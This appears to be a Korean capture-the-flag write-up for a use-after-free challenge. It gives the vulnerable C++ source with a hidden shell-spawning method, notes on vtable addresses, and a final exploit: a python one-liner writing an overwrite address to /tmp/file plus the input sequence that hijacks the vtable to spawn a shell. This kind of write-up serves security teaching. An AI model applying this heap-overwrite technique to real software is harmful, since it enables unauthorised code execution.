!!!\#include \<fcntl.h></br>
\#include \<iostream></br>
\#include \<cstring></br>
\#include \<cstdlib></br>
\#include \<unistd.h></br>
using namespace std;</br>

class Human{</br>private:</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;virtual void give_shell(){</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system("/bin/sh");</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</br>
protected:</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int age;</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;string name;</br>
public:</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;virtual void introduce(){</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cout << "My name is " << name << endl;</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cout << "I am " << age << " years old" << endl</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</br>};</br>

class Man: public Human{</br>public:</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Man(string name, int age){</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this->name = name;</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this->age = age;</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;virtual void introduce(){</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Human::introduce();</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cout << "I am a nice guy!" << endl;</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</br>};</br>

class Woman: public Human{</br>public:</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Woman(string name, int age){</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this->name = name;</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this->age = age;</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;virtual void introduce(){</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Human::introduce();</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cout << "I am a cute girl!" << endl;</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</br>
};</br>

int main(int argc, char\* argv[]){</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Human* m = new Man("Jack", 25);</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Human* w = new Woman("Jill", 21);</br>

        size_t len;	
	char* data;</br>
	unsigned int op;</br>
	while(1){</br>
		cout << "1. use\n2. after\n3. free\n";</br>
		cin >> op;</br>

		switch(op){</br>
			case 1:</br>
				m->introduce();</br>
				w->introduce();</br>
				break;</br>
			case 2:</br>
				len = atoi(argv[1]);</br>
				data = new char[len];</br>
				read(open(argv[2], O_RDONLY), data, len);</br>
				cout \<< "your data is allocated" << endl;</br>
				break;</br>
			case 3:</br>
				delete m;</br>
				delete w;</br>
				break;</br>
			default:</br>
				break;</br>
		}</br>
	}</br>
</br>
	return 0;	</br>
}</br>
</br>


처음 1을 입력->3을 입력해서 free를 해보자

c25c50(이건 바뀜)->401570->40117a(HUMAN의 give_shell)인데, +8해서 401578->4012d2(MAN의 introduce) 후자가 실행된다.	
	3을 입력하면 c25c50이 401590->40117a 으로 바뀐 후, c25c50이 모두 지워져버린다.	 
c25ca0->401550->40117a(HUMAN의 give_shell)인데, +8해서 401558->401376(WOMAN의 introduce)이 실행된다. 
	이 또한, 3을 입력하면, c25ca0이 401590->40117a으로 바뀐 후, c25ca0이 모두 지워버린다.

1->3 delete하지 않고, 2를 할 경우
1->2 c25ca0보다 훨씬 뒤에 입력이 된다.
b40c50, b40ca0일때 -> b414e0 b41510
/tmp/file을 만드는 법
python -c 'print "AAAA"' > /tmp/file

1->3->2 c25ca0에 AAAA입력 된다. 1->3->2->2 c25ca0에 AAAA입력, c25c50에 AAAA입력
Use after free를 이용!!(free된 후, free된 부분에 덮어써진다.)
그러면 c25c50에 0x401568이 입력되면, +8인 0x401570이 실행되고, 0x40117a가 실행되어 쉘이 따진다!

python -c 'print "\x68\x15\x40"' > /tmp/file
./uaf 3 /tmp/file
1->3->2->2->1
